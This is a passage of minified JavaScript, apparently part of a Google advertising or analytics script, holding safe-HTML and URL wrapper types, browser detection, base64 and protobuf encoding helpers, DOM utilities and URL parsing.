    l.zc = function() {
        return 1
    };
    l.toString = function() {
        return this.g + ""
    };
    var gc = function(a) {
            return a instanceof fc && a.constructor === fc ? a.g : "type_error:TrustedResourceUrl"
        },
        ec = {},
        hc = function(a) {
            var b = Zb();
            a = b ? b.createScriptURL(a) : a;
            return new fc(a, ec)
        };
    var ic = function(a, b) {
            var c = a.length - b.length;
            return 0 <= c && a.indexOf(b, c) == c
        },
        jc = function(a) {
            return /^[\s\xa0]*$/.test(a)
        },
        kc = String.prototype.trim ? function(a) {
            return a.trim()
        } : function(a) {
            return /^[\s\xa0]*([\s\S]*?)[\s\xa0]*$/.exec(a)[1]
        },
        lc = /&/g,
        mc = /</g,
        nc = />/g,
        oc = /"/g,
        pc = /'/g,
        qc = /\x00/g,
        rc = /[\x00&<>"']/,
        sc = function(a, b) {
            return -1 != a.toLowerCase().indexOf(b.toLowerCase())
        },
        uc = function(a, b) {
            var c = 0;
            a = kc(String(a)).split(".");
            b = kc(String(b)).split(".");
            for (var d = Math.max(a.length, b.length), e = 0; 0 == c &&
                e < d; e++) {
                var f = a[e] || "",
                    g = b[e] || "";
                do {
                    f = /(\d*)(\D*)(.*)/.exec(f) || ["", "", "", ""];
                    g = /(\d*)(\D*)(.*)/.exec(g) || ["", "", "", ""];
                    if (0 == f[0].length && 0 == g[0].length) break;
                    c = tc(0 == f[1].length ? 0 : parseInt(f[1], 10), 0 == g[1].length ? 0 : parseInt(g[1], 10)) || tc(0 == f[2].length, 0 == g[2].length) || tc(f[2], g[2]);
                    f = f[3];
                    g = g[3]
                } while (0 == c)
            }
            return c
        },
        tc = function(a, b) {
            return a < b ? -1 : a > b ? 1 : 0
        };
    var wc = function(a, b) {
        this.g = b === vc ? a : ""
    };
    l = wc.prototype;
    l.Qa = !0;
    l.Fa = function() {
        return this.g.toString()
    };
    l.Dc = !0;
    l.zc = function() {
        return 1
    };
    l.toString = function() {
        return this.g.toString()
    };
    var xc = function(a) {
            return a instanceof wc && a.constructor === wc ? a.g : "type_error:SafeUrl"
        },
        yc = RegExp('^(?:audio/(?:3gpp2|3gpp|aac|L16|midi|mp3|mp4|mpeg|oga|ogg|opus|x-m4a|x-matroska|x-wav|wav|webm)|font/\\w+|image/(?:bmp|gif|jpeg|jpg|png|tiff|webp|x-icon)|video/(?:mpeg|mp4|ogg|webm|quicktime|x-matroska))(?:;\\w+=(?:\\w+|"[\\w;,= ]+"))*$', "i"),
        zc = /^data:(.*);base64,[a-z0-9+\/]+=*$/i,
        Ac = /^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))/i,
        vc = {},
        Bc = new wc("about:invalid#zClosurez", vc);
    var Cc = {},
        Dc = function(a, b) {
            this.g = b === Cc ? a : "";
            this.Qa = !0
        };
    Dc.prototype.Fa = function() {
        return this.g
    };
    Dc.prototype.toString = function() {
        return this.g.toString()
    };
    var Ec = new Dc("", Cc);
    var Fc;
    a: {
        var Gc = u.navigator;
        if (Gc) {
            var Hc = Gc.userAgent;
            if (Hc) {
                Fc = Hc;
                break a
            }
        }
        Fc = ""
    }
    var A = function(a) {
        return -1 != Fc.indexOf(a)
    };
    var Ic = function() {
            return A("Trident") || A("MSIE")
        },
        Jc = function() {
            return A("Firefox") || A("FxiOS")
        },
        Lc = function() {
            return A("Safari") && !(Kc() || A("Coast") || A("Opera") || A("Edge") || A("Edg/") || A("OPR") || Jc() || A("Silk") || A("Android"))
        },
        Kc = function() {
            return (A("Chrome") || A("CriOS")) && !A("Edge")
        };
    var Mc = {},
        Nc = function(a, b, c) {
            this.g = c === Mc ? a : "";
            this.h = b;
            this.Qa = this.Dc = !0
        };
    Nc.prototype.zc = function() {
        return this.h
    };
    Nc.prototype.Fa = function() {
        return this.g.toString()
    };
    Nc.prototype.toString = function() {
        return this.g.toString()
    };
    var Oc = function(a) {
            return a instanceof Nc && a.constructor === Nc ? a.g : "type_error:SafeHtml"
        },
        Pc = function(a, b) {
            var c = Zb();
            a = c ? c.createHTML(a) : a;
            return new Nc(a, b, Mc)
        },
        Qc = new Nc(u.trustedTypes && u.trustedTypes.emptyHTML || "", 0, Mc);
    var Rc = jb(function() {
            var a = document.createElement("div"),
                b = document.createElement("div");
            b.appendChild(document.createElement("div"));
            a.appendChild(b);
            b = a.firstChild.firstChild;
            a.innerHTML = Oc(Qc);
            return !b.parentElement
        }),
        Sc = function(a, b) {
            if (Rc())
                for (; a.lastChild;) a.removeChild(a.lastChild);
            a.innerHTML = Oc(b)
        },
        Tc = function(a, b) {
            a.write(Oc(b))
        },
        Uc = /^[\w+/_-]+[=]{0,2}$/,
        Vc = function(a, b) {
            b = (b || u).document;
            return b.querySelector ? (a = b.querySelector(a)) && (a = a.nonce || a.getAttribute("nonce")) && Uc.test(a) ? a :
                "" : ""
        };
    var Wc = function(a) {
            return decodeURIComponent(a.replace(/\+/g, " "))
        },
        Xc = function(a, b) {
            a.length > b && (a = a.substring(0, b - 3) + "...");
            return a
        },
        Yc = String.prototype.repeat ? function(a, b) {
            return a.repeat(b)
        } : function(a, b) {
            return Array(b + 1).join(a)
        },
        Zc = function(a) {
            return null == a ? "" : String(a)
        },
        $c = 2147483648 * Math.random() | 0,
        bd = function(a) {
            return String(a).replace(/\-([a-z])/g, function(b, c) {
                return c.toUpperCase()
            })
        },
        cd = function() {
            return "googleAvInapp".replace(/([A-Z])/g, "-$1").toLowerCase()
        },
        dd = function(a) {
            return a.replace(RegExp("(^|[\\s]+)([a-z])",
                "g"), function(b, c, d) {
                return c + d.toUpperCase()
            })
        },
        ed = function(a) {
            isFinite(a) && (a = String(a));
            return "string" === typeof a ? /^\s*-?0x/i.test(a) ? parseInt(a, 16) : parseInt(a, 10) : NaN
        };
    var fd = "function" === typeof Uint8Array.prototype.slice,
        gd, hd = 0,
        id = 0;

    function jd(a) {
        var b = 0 > a;
        a = Math.abs(a);
        var c = a >>> 0;
        a = Math.floor((a - c) / 4294967296);
        a >>>= 0;
        b && (a = ~a >>> 0, c = (~c >>> 0) + 1, 4294967295 < c && (c = 0, a++, 4294967295 < a && (a = 0)));
        hd = c;
        id = a
    };
    var kd = function() {
        this.g = new Uint8Array(64);
        this.h = 0
    };
    kd.prototype.push = function(a) {
        if (!(this.h + 1 < this.g.length)) {
            var b = this.g;
            this.g = new Uint8Array(Math.ceil(1 + 2 * this.g.length));
            this.g.set(b)
        }
        this.g[this.h++] = a
    };
    kd.prototype.length = function() {
        return this.h
    };
    kd.prototype.end = function() {
        var a = this.g,
            b = this.h;
        this.h = 0;
        return 0 === b ? gd || (gd = new Uint8Array(0)) : fd ? a.slice(0, b) : new Uint8Array(a.subarray(0, b))
    };
    var ld = function(a) {
            for (var b = hd, c = id; 0 < c || 127 < b;) a.push(b & 127 | 128), b = (b >>> 7 | c << 25) >>> 0, c >>>= 7;
            a.push(b)
        },
        md = function(a, b) {
            for (; 127 < b;) a.push(b & 127 | 128), b >>>= 7;
            a.push(b)
        },
        nd = function(a, b) {
            a.push(b >>> 0 & 255);
            a.push(b >>> 8 & 255);
            a.push(b >>> 16 & 255);
            a.push(b >>> 24 & 255)
        };
    var od = function() {
            return A("iPhone") && !A("iPod") && !A("iPad")
        },
        pd = function() {
            return od() || A("iPad") || A("iPod")
        };
    var qd = function(a) {
        qd[" "](a);
        return a
    };
    qd[" "] = La;
    var rd = function(a, b) {
            try {
                return qd(a[b]), !0
            } catch (c) {}
            return !1
        },
        td = function(a, b) {
            var c = sd;
            return Object.prototype.hasOwnProperty.call(c, a) ? c[a] : c[a] = b(a)
        };
    var ud = A("Opera"),
        vd = Ic(),
        wd = A("Edge"),
        xd = A("Gecko") && !(sc(Fc, "WebKit") && !A("Edge")) && !(A("Trident") || A("MSIE")) && !A("Edge"),
        yd = sc(Fc, "WebKit") && !A("Edge"),
        zd = A("Macintosh"),
        Bd = A("Android"),
        Cd = od(),
        Dd = A("iPad"),
        Ed = A("iPod"),
        Fd = pd(),
        Gd = function() {
            var a = u.document;
            return a ? a.documentMode : void 0
        },
        Hd;
    a: {
        var Id = "",
            Jd = function() {
                var a = Fc;
                if (xd) return /rv:([^\);]+)(\)|;)/.exec(a);
                if (wd) return /Edge\/([\d\.]+)/.exec(a);
                if (vd) return /\b(?:MSIE|rv)[: ]([^\);]+)(\)|;)/.exec(a);
                if (yd) return /WebKit\/(\S+)/.exec(a);
                if (ud) return /(?:Version)[ \/]?(\S+)/.exec(a)
            }();Jd && (Id = Jd ? Jd[1] : "");
        if (vd) {
            var Kd = Gd();
            if (null != Kd && Kd > parseFloat(Id)) {
                Hd = String(Kd);
                break a
            }
        }
        Hd = Id
    }
    var Ld = Hd,
        sd = {},
        Md = function(a) {
            return td(a, function() {
                return 0 <= uc(Ld, a)
            })
        },
        Nd;
    if (u.document && vd) {
        var Od = Gd();
        Nd = Od ? Od : parseInt(Ld, 10) || void 0
    } else Nd = void 0;
    var Pd = Nd;
    var Qd = Jc(),
        Rd = od() || A("iPod"),
        Sd = A("iPad"),
        Td = A("Android") && !(Kc() || Jc() || A("Opera") || A("Silk")),
        Ud = Kc(),
        Vd = Lc() && !pd();
    var Wd = {},
        Xd = null,
        Zd = function(a, b) {
            void 0 === b && (b = 0);
            Yd();
            b = Wd[b];
            for (var c = Array(Math.floor(a.length / 3)), d = b[64] || "", e = 0, f = 0; e < a.length - 2; e += 3) {
                var g = a[e],
                    h = a[e + 1],
                    k = a[e + 2],
                    n = b[g >> 2];
                g = b[(g & 3) << 4 | h >> 4];
                h = b[(h & 15) << 2 | k >> 6];
                k = b[k & 63];
                c[f++] = "" + n + g + h + k
            }
            n = 0;
            k = d;
            switch (a.length - e) {
                case 2:
                    n = a[e + 1], k = b[(n & 15) << 2] || d;
                case 1:
                    a = a[e], c[f] = "" + b[a >> 2] + b[(a & 3) << 4 | n >> 4] + k + d
            }
            return c.join("")
        },
        $d = function(a) {
            for (var b = [], c = 0, d = 0; d < a.length; d++) {
                var e = a.charCodeAt(d);
                255 < e && (b[c++] = e & 255, e >>= 8);
                b[c++] = e
            }
            return Zd(b,
                3)
        },
        be = function(a) {
            var b = [];
            ae(a, function(c) {
                b.push(c)
            });
            return b
        },
        ae = function(a, b) {
            function c(k) {
                for (; d < a.length;) {
                    var n = a.charAt(d++),
                        m = Xd[n];
                    if (null != m) return m;
                    if (!jc(n)) throw Error("Unknown base64 encoding at char: " + n);
                }
                return k
            }
            Yd();
            for (var d = 0;;) {
                var e = c(-1),
                    f = c(0),
                    g = c(64),
                    h = c(64);
                if (64 === h && -1 === e) break;
                b(e << 2 | f >> 4);
                64 != g && (b(f << 4 & 240 | g >> 2), 64 != h && b(g << 6 & 192 | h))
            }
        },
        Yd = function() {
            if (!Xd) {
                Xd = {};
                for (var a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""), b = ["+/=", "+/",
                        "-_=", "-_.", "-_"
                    ], c = 0; 5 > c; c++) {
                    var d = a.concat(b[c].split(""));
                    Wd[c] = d;
                    for (var e = 0; e < d.length; e++) {
                        var f = d[e];
                        void 0 === Xd[f] && (Xd[f] = e)
                    }
                }
            }
        };
    var ce = function() {
            this.l = [];
            this.h = 0;
            this.g = new kd
        },
        de = function(a, b) {
            0 !== b.length && (a.l.push(b), a.h += b.length)
        },
        ee = function(a) {
            de(a, a.g.end())
        },
        fe = function(a, b) {
            md(a.g, 8 * b + 2);
            ee(a);
            return {
                Xe: a.h,
                se: a.l.length - 1
            }
        },
        ge = function(a, b) {
            ee(a);
            md(a.g, a.h + a.g.length() - b.Xe);
            var c = a.g.end();
            a.h += c.length;
            a.l.splice(1 + b.se, 0, c)
        },
        he = function(a) {
            var b = a.h + a.g.length();
            if (0 === b) return new Uint8Array(0);
            b = new Uint8Array(b);
            for (var c = a.l, d = c.length, e = 0, f = 0; f < d; f++) {
                var g = c[f];
                0 !== g.length && (b.set(g, e), e += g.length)
            }
            c =
                a.g;
            d = c.h;
            0 !== d && (b.set(c.g.subarray(0, d), e), c.h = 0);
            a.l = [b];
            return b
        },
        ie = function(a, b, c) {
            if (null != c && null != c)
                if (md(a.g, 8 * b), a = a.g, 0 <= c) md(a, c);
                else {
                    for (b = 0; 9 > b; b++) a.push(c & 127 | 128), c >>= 7;
                    a.push(1)
                }
        },
        je = function(a, b, c) {
            null != c && null != c && (md(a.g, 8 * b), a = a.g, jd(c), ld(a))
        },
        ke = function(a, b, c) {
            null != c && null != c && (md(a.g, 8 * b), a = a.g, jd(c), ld(a))
        },
        le = function(a, b, c) {
            md(a.g, 8 * b + 2);
            md(a.g, c.length);
            ee(a);
            de(a, c)
        },
        ne = function(a, b, c) {
            var d = me;
            null != c && (b = fe(a, b), d(c, a), ge(a, b))
        },
        oe = function(a, b, c, d) {
            if (null != c)
                for (var e =
                        0; e < c.length; e++) {
                    var f = fe(a, b);
                    d(c[e], a);
                    ge(a, f)
                }
        };
    var pe = "function" === typeof Uint8Array;

    function qe(a, b, c) {
        return "object" === typeof a ? pe && !Array.isArray(a) && a instanceof Uint8Array ? c(a) : re(a, b, c) : b(a)
    }

    function re(a, b, c) {
        if (Array.isArray(a)) {
            for (var d = Array(a.length), e = 0; e < a.length; e++) {
                var f = a[e];
                null != f && (d[e] = qe(f, b, c))
            }
            Array.isArray(a) && a.Ve && se(d);
            return d
        }
        d = {};
        for (e in a) f = a[e], null != f && (d[e] = qe(f, b, c));
        return d
    }

    function te(a) {
        return re(a, function(b) {
            return "number" === typeof b ? isFinite(b) ? b : String(b) : b
        }, function(b) {
            return Zd(b)
        })
    }
    var ue = {
            Ve: {
                value: !0,
                configurable: !0
            }
        },
        se = function(a) {
            Array.isArray(a) && !Object.isFrozen(a) && Object.defineProperties(a, ue);
            return a
        },
        ve;
    var we;

    function xe(a, b) {
        we = b;
        a = new a(b);
        we = null;
        return a
    };
    var B = function(a, b, c) {
            var d = we;
            we = null;
            a || (a = d);
            d = this.constructor.messageId;
            a || (a = d ? [d] : []);
            this.o = d ? 0 : -1;
            this.g = null;
            this.h = a;
            a: {
                d = this.h.length;a = d - 1;
                if (d && (d = this.h[a], !(null === d || "object" != typeof d || Array.isArray(d) || pe && d instanceof Uint8Array))) {
                    this.B = a - this.o;
                    this.l = d;
                    break a
                }
                void 0 !== b && -1 < b ? (this.B = Math.max(b, a + 1 - this.o), this.l = null) : this.B = Number.MAX_VALUE
            }
            if (c)
                for (b = 0; b < c.length; b++) a = c[b], a < this.B ? (a += this.o, (d = this.h[a]) ? se(d) : this.h[a] = ye) : (ze(this), (d = this.l[a]) ? se(d) : this.l[a] = ye)
        },
        ye = Object.freeze(se([])),
        ze = function(a) {
            var b = a.B + a.o;
            a.h[b] || (a.l = a.h[b] = {})
        },
        C = function(a, b) {
            if (-1 === b) return null;
            if (b < a.B) {
                b += a.o;
                var c = a.h[b];
                return c !== ye ? c : a.h[b] = se([])
            }
            if (a.l) return c = a.l[b], c !== ye ? c : a.l[b] = se([])
        },
        Ae = function(a, b) {
            a = C(a, b);
            return null == a ? a : +a
        },
        Be = function(a, b) {
            a = C(a, b);
            return null == a ? a : !!a
        },
        Ce = function(a, b, c) {
            a = C(a, b);
            return null == a ? c : a
        },
        De = function(a, b) {
            var c = void 0 === c ? !1 : c;
            a = Be(a, b);
            return null == a ? c : a
        },
        Ee = function(a, b, c) {
            b < a.B ? a.h[b + a.o] = c : (ze(a), a.l[b] = c);
            return a
        },
        Fe = function(a, b, c) {
            return Ee(a, b, se(c || []))
        };

    function Ge(a, b, c, d) {
        c !== d ? Ee(a, b, c) : Ee(a, b, void 0);
        return a
    }
    var He = function(a, b) {
            for (var c = 0, d = 0; d < b.length; d++) {
                var e = b[d];
                null != C(a, e) && (0 !== c && Ee(a, c, void 0), c = e)
            }
            return c
        },
        Ie = function(a, b, c) {
            if (-1 === c) return null;
            a.g || (a.g = {});
            if (!a.g[c]) {
                var d = C(a, c);
                d && (a.g[c] = new b(d))
            }
            return a.g[c]
        },
        Je = function(a, b, c) {
            a.g || (a.g = {});
            if (!a.g[c]) {
                for (var d = C(a, c), e = [], f = 0; f < d.length; f++) e[f] = new b(d[f]);
                a.g[c] = e
            }
            return a.g[c]
        },
        Le = function(a, b, c) {
            a.g || (a.g = {});
            var d = c ? Ke(c, !1) : c;
            a.g[b] = c;
            return Ee(a, b, d)
        };
    B.prototype.toJSON = function() {
        var a = Ke(this, !1);
        return ve ? a : te(a)
    };
    var Ke = function(a, b) {
            if (a.g)
                for (var c in a.g) {
                    var d = a.g[c];
                    if (Array.isArray(d))
                        for (var e = 0; e < d.length; e++) d[e] && Ke(d[e], b);
                    else d && Ke(d, b)
                }
            return a.h
        },
        Ne = function(a) {
            ve = !0;
            try {
                return JSON.stringify(a.toJSON(), Me)
            } finally {
                ve = !1
            }
        },
        Me = function(a, b) {
            switch (typeof b) {
                case "number":
                    return isFinite(b) ? b : String(b);
                case "object":
                    if (pe && null != b && b instanceof Uint8Array) return Zd(b)
            }
            return b
        };
    B.prototype.toString = function() {
        return Ke(this, !1).toString()
    };
    var Oe = function(a, b, c) {
        b = He(a, c) === b ? b : -1;
        return Ce(a, b, 0)
    };

    function Pe(a, b) {
        if (a = a.A) {
            ee(b);
            for (var c = 0; c < a.length; c++) de(b, a[c])
        }
    };
    var Qe = document,
        D = window;
    var Re = {};

    function Se() {
        var a = "undefined" !== typeof window ? window.trustedTypes : void 0;
        return null !== a && void 0 !== a ? a : null
    }
    var Te;

    function Ue() {
        var a, b;
        if (void 0 === Te) try {
            Te = null !== (b = null === (a = Se()) || void 0 === a ? void 0 : a.createPolicy("google#safe", {
                createHTML: function(c) {
                    return c
                },
                createScript: function(c) {
                    return c
                },
                createScriptURL: function(c) {
                    return c
                }
            })) && void 0 !== b ? b : null
        } catch (c) {
            Te = null, console.log(c)
        }
        return Te
    };
    var Ve = function() {},
        We = function(a) {
            this.g = a
        };
    t(We, Ve);
    We.prototype.toString = function() {
        return this.g
    };
    var Xe = new We("about:invalid#zTSz", Re);
    var Ye = function() {},
        Ze = function(a) {
            this.g = a
        };
    t(Ze, Ye);
    Ze.prototype.toString = function() {
        return this.g.toString()
    };

    function $e(a) {
        var b, c = null === (b = Ue()) || void 0 === b ? void 0 : b.createScriptURL(a);
        return new Ze(null !== c && void 0 !== c ? c : a, Re)
    };

    function af(a) {
        if (a instanceof Ye)
            if (a instanceof Ze) a = a.g;
            else throw Error("");
        else a = gc(a);
        return a
    }

    function bf(a) {
        if (a instanceof Ve)
            if (a instanceof We) a = a.g;
            else throw Error("");
        else a = xc(a);
        return a
    };

    function cf(a) {
        var b, c = (a.ownerDocument && a.ownerDocument.defaultView || window).document,
            d = null === (b = c.querySelector) || void 0 === b ? void 0 : b.call(c, "script[nonce]");
        (b = d ? d.nonce || d.getAttribute("nonce") || "" : "") && a.setAttribute("nonce", b)
    };
    var df = jb(function() {
        var a = !1;
        try {
            var b = Object.defineProperty({}, "passive", {
                get: function() {
                    a = !0
                }
            });
            u.addEventListener("test", null, b)
        } catch (c) {}
        return a
    });

    function ef(a) {
        return a ? a.passive && df() ? a : a.capture || !1 : !1
    }
    var ff = function(a, b, c, d) {
            return a.addEventListener ? (a.addEventListener(b, c, ef(d)), !0) : !1
        },
        gf = function(a, b, c) {
            a.removeEventListener && a.removeEventListener(b, c, ef(void 0))
        },
        hf = function(a) {
            var b = void 0 === b ? {} : b;
            if ("function" === typeof window.CustomEvent) var c = new CustomEvent("rum_blp", b);
            else c = document.createEvent("CustomEvent"), c.initCustomEvent("rum_blp", !!b.bubbles, !!b.cancelable, b.detail);
            a.dispatchEvent(c)
        };
    try {
        (new self.OffscreenCanvas(0, 0)).getContext("2d")
    } catch (a) {}
    var jf = vd || yd;
    var kf = function(a, b) {
        this.x = void 0 !== a ? a : 0;
        this.y = void 0 !== b ? b : 0
    };
    kf.prototype.ceil = function() {
        this.x = Math.ceil(this.x);
        this.y = Math.ceil(this.y);
        return this
    };
    kf.prototype.floor = function() {
        this.x = Math.floor(this.x);
        this.y = Math.floor(this.y);
        return this
    };
    kf.prototype.round = function() {
        this.x = Math.round(this.x);
        this.y = Math.round(this.y);
        return this
    };
    kf.prototype.scale = function(a, b) {
        this.x *= a;
        this.y *= "number" === typeof b ? b : a;
        return this
    };
    var lf = function(a, b) {
        this.width = a;
        this.height = b
    };
    l = lf.prototype;
    l.aspectRatio = function() {
        return this.width / this.height
    };
    l.isEmpty = function() {
        return !(this.width * this.height)
    };
    l.ceil = function() {
        this.width = Math.ceil(this.width);
        this.height = Math.ceil(this.height);
        return this
    };
    l.floor = function() {
        this.width = Math.floor(this.width);
        this.height = Math.floor(this.height);
        return this
    };
    l.round = function() {
        this.width = Math.round(this.width);
        this.height = Math.round(this.height);
        return this
    };
    l.scale = function(a, b) {
        this.width *= a;
        this.height *= "number" === typeof b ? b : a;
        return this
    };
    var of = function(a) {
        return a ? new mf(nf(a)) : cb || (cb = new mf)
    }, pf = function(a) {
            var b = document;
            return "string" === typeof a ? b.getElementById(a) : a
        }, qf = function() {
            var a = document;
            return a.querySelectorAll && a.querySelector ? a.querySelectorAll("SCRIPT") : a.getElementsByTagName("SCRIPT")
        }, sf = function(a, b) {
            Gb(b, function(c, d) {
                c && "object" == typeof c && c.Qa && (c = c.Fa());
                "style" == d ? a.style.cssText = c : "class" == d ? a.className = c : "for" == d ? a.htmlFor = c : rf.hasOwnProperty(d) ? a.setAttribute(rf[d], c) : 0 == d.lastIndexOf("aria-", 0) || 0 ==
                    d.lastIndexOf("data-", 0) ? a.setAttribute(d, c) : a[d] = c
            })
        }, rf = {
            cellpadding: "cellPadding",
            cellspacing: "cellSpacing",
            colspan: "colSpan",
            frameborder: "frameBorder",
            height: "height",
            maxlength: "maxLength",
            nonce: "nonce",
            role: "role",
            rowspan: "rowSpan",
            type: "type",
            usemap: "useMap",
            valign: "vAlign",
            width: "width"
        }, tf = function(a) {
            a = a.document;
            a = "CSS1Compat" == a.compatMode ? a.documentElement : a.body;
            return new lf(a.clientWidth, a.clientHeight)
        }, uf = function(a) {
            var b = a.scrollingElement ? a.scrollingElement : yd || "CSS1Compat" != a.compatMode ?
                a.body || a.documentElement : a.documentElement;
            a = a.parentWindow || a.defaultView;
            return vd && Md("10") && a.pageYOffset != b.scrollTop ? new kf(b.scrollLeft, b.scrollTop) : new kf(a.pageXOffset || b.scrollLeft, a.pageYOffset || b.scrollTop)
        }, E = function(a) {
            return a ? a.parentWindow || a.defaultView : window
        }, xf = function(a, b, c) {
            var d = arguments,
                e = document,
                f = d[1],
                g = vf(e, String(d[0]));
            f && ("string" === typeof f ? g.className = f : Array.isArray(f) ? g.className = f.join(" ") : sf(g, f));
            2 < d.length && wf(e, g, d, 2);
            return g
        }, wf = function(a, b, c, d) {
            function e(h) {
                h &&
                    b.appendChild("string" === typeof h ? a.createTextNode(h) : h)
            }
            for (; d < c.length; d++) {
                var f = c[d];
                if (!Ma(f) || Na(f) && 0 < f.nodeType) e(f);
                else {
                    a: {
                        if (f && "number" == typeof f.length) {
                            if (Na(f)) {
                                var g = "function" == typeof f.item || "string" == typeof f.item;
                                break a
                            }
                            if ("function" === typeof f) {
                                g = "function" == typeof f.item;
                                break a
                            }
                        }
                        g = !1
                    }
                    z(g ? Bb(f) : f, e)
                }
            }
        }, vf = function(a, b) {
            b = String(b);
            "application/xhtml+xml" === a.contentType && (b = b.toLowerCase());
            return a.createElement(b)
        }, yf = function(a) {
            a && a.parentNode && a.parentNode.removeChild(a)
        },
        zf = function(a) {
            var b;
            if (jf && !(vd && Md("9") && !Md("10") && u.SVGElement && a instanceof u.SVGElement) && (b = a.parentElement)) return b;
            b = a.parentNode;
            return Na(b) && 1 == b.nodeType ? b : null
        }, Af = function(a, b) {
            if (!a || !b) return !1;
            if (a.contains && 1 == b.nodeType) return a == b || a.contains(b);
            if ("undefined" != typeof a.compareDocumentPosition) return a == b || !!(a.compareDocumentPosition(b) & 16);
            for (; b && a != b;) b = b.parentNode;
            return b == a
        }, nf = function(a) {
            return 9 == a.nodeType ? a : a.ownerDocument || a.document
        }, Bf = function(a) {
            try {
                return a.contentWindow ||
                    (a.contentDocument ? E(a.contentDocument) : null)
            } catch (b) {}
            return null
        }, Cf = function(a, b) {
            a && (a = a.parentNode);
            for (var c = 0; a;) {
                if (b(a)) return a;
                a = a.parentNode;
                c++
            }
            return null
        }, mf = function(a) {
            this.g = a || u.document || document
        };
    l = mf.prototype;
    l.getElementsByTagName = function(a, b) {
        return (b || this.g).getElementsByTagName(String(a))
    };
    l.createElement = function(a) {
        return vf(this.g, a)
    };
    l.appendChild = function(a, b) {
        a.appendChild(b)
    };
    l.append = function(a, b) {
        wf(nf(a), a, arguments, 1)
    };
    l.canHaveChildren = function(a) {
        if (1 != a.nodeType) return !1;
        switch (a.tagName) {
            case "APPLET":
            case "AREA":
            case "BASE":
            case "BR":
            case "COL":
            case "COMMAND":
            case "EMBED":
            case "FRAME":
            case "HR":
            case "IMG":
            case "INPUT":
            case "IFRAME":
            case "ISINDEX":
            case "KEYGEN":
            case "LINK":
            case "NOFRAMES":
            case "NOSCRIPT":
            case "META":
            case "OBJECT":
            case "PARAM":
            case "SCRIPT":
            case "SOURCE":
            case "STYLE":
            case "TRACK":
            case "WBR":
                return !1
        }
        return !0
    };
    var Ef = function() {
            return !Df() && (A("iPod") || A("iPhone") || A("Android") || A("IEMobile"))
        },
        Df = function() {
            return A("iPad") || A("Android") && !A("Mobile") || A("Silk")
        };
    var Ff = RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$"),
        Gf = function(a) {
            var b = a.match(Ff);
            a = b[1];
            var c = b[3];
            b = b[4];
            var d = "";
            a && (d += a + ":");
            c && (d = d + "//" + c, b && (d += ":" + b));
            return d
        },
        Hf = function(a, b) {
            if (a) {
                a = a.split("&");
                for (var c = 0; c < a.length; c++) {
                    var d = a[c].indexOf("="),
                        e = null;
                    if (0 <= d) {
                        var f = a[c].substring(0, d);
                        e = a[c].substring(d + 1)
                    } else f = a[c];
                    b(f, e ? Wc(e) : "")
                }
            }
        },
        If = /#|$/,
        Jf = function(a, b) {
            var c = a.search(If);
            a: {
                var d =
                    0;
                for (var e = b.length; 0 <= (d = a.indexOf(b, d)) && d < c;) {
                    var f = a.charCodeAt(d - 1);
                    if (38 == f || 63 == f)
                        if (f = a.charCodeAt(d + e), !f || 61 == f || 38 == f || 35 == f) break a;
                    d += e + 1
                }
                d = -1
            }
            if (0 > d) return null;
            e = a.indexOf("&", d);
            if (0 > e || e > c) e = c;
            d += b.length + 1;
            return Wc(a.substr(d, e - d))
        };
    var Kf = function(a) {
            try {
                return !!a && null != a.location.href && rd(a, "foo")
            } catch (b) {
                return !1
            }
        },
        Mf = function(a) {
            for (var b = u, c = 0; b && 40 > c++ && (!Kf(b) || !a(b));) b = Lf(b)
        },
        Nf = function() {
            var a, b = a = void 0 === a ? u : a;
            Mf(function(c) {
                b = c;
                return !1
            });
            return b
        },
        Lf = function(a) {
            try {
                var b = a.parent;
                if (b && b != a) return b
            } catch (c) {}
            return null
        },
        Of = function(a, b) {
            if (a)
                for (var c in a) Object.prototype.hasOwnProperty.call(a, c) && b.call(void 0, a[c], c, a)
        },
        Pf = /https?:\/\/[^\/]+/,
        Qf = function(a) {
            return (a = Pf.exec(a)) && a[0] || ""
        },
        Rf = function() {
            var a =
                u;
            var b = void 0 === b ? !0 : b;
            try {
                for (var c = null; c != a; c = a, a = a.parent) switch (a.location.protocol) {
                    case "https:":
                        return !0;
                    case "file:":
                        return b;
                    case "http:":
                        return !1
                }
            } catch (d) {}
            return !0
        },
        Tf = function() {
            var a = Sf;
            if (!a) return "";
            var b = RegExp(".*[&#?]google_debug(=[^&]*)?(&.*)?$");
            try {
                var c = b.exec(decodeURIComponent(a));
                if (c) return c[1] && 1 < c[1].length ? c[1].substring(1) : "true"
            } catch (d) {}
            return ""
        },
        Uf = function(a, b) {
            try {
                return !(!a.frames || !a.frames[b])
            } catch (c) {
                return !1
            }
        },
        Vf = function(a, b) {
            for (var c = 0; 50 > c; ++c) {
                if (Uf(a,
                        b)) return a;
                if (!(a = Lf(a))) break
            }
            return null
        },
        Wf = function(a, b) {
            b = void 0 === b ? window.document : b;
            0 != a.length && b.head && a.forEach(function(c) {
                if (c) {
                    var d = b;
                    d = void 0 === d ? window.document : d;
                    if (c && d.head) {
                        var e = document.createElement("meta");
                        d.head.appendChild(e);
                        e.httpEquiv = "origin-trial";
                        e.content = c
                    }
                }
            })
        };
    var F = function(a, b, c, d) {
        this.top = a;
        this.right = b;
        this.bottom = c;
        this.left = d
    };
    F.prototype.getWidth = function() {
        return this.right - this.left
    };
    F.prototype.getHeight = function() {
        return this.bottom - this.top
    };
    var Xf = function(a) {
        return new F(a.top, a.right, a.bottom, a.left)
    };
    F.prototype.expand = function(a, b, c, d) {
        Na(a) ? (this.top -= a.top, this.right += a.right, this.bottom += a.bottom, this.left -= a.left) : (this.top -= a, this.right += Number(b), this.bottom += Number(c), this.left -= Number(d));
        return this
    };
    F.prototype.ceil = function() {
        this.top = Math.ceil(this.top);
        this.right = Math.ceil(this.right);
        this.bottom = Math.ceil(this.bottom);
        this.left = Math.ceil(this.left);
        return this
    };
    F.prototype.floor = function() {
        this.top = Math.floor(this.top);
        this.right = Math.floor(this.right);
        this.bottom = Math.floor(this.bottom);
        this.left = Math.floor(this.left);
        return this
    };
    F.prototype.round = function() {
        this.top = Math.round(this.top);
        this.right = Math.round(this.right);
        this.bottom = Math.round(this.bottom);
        this.left = Math.round(this.left);
        return this
    };
    var Yf = function(a, b, c) {
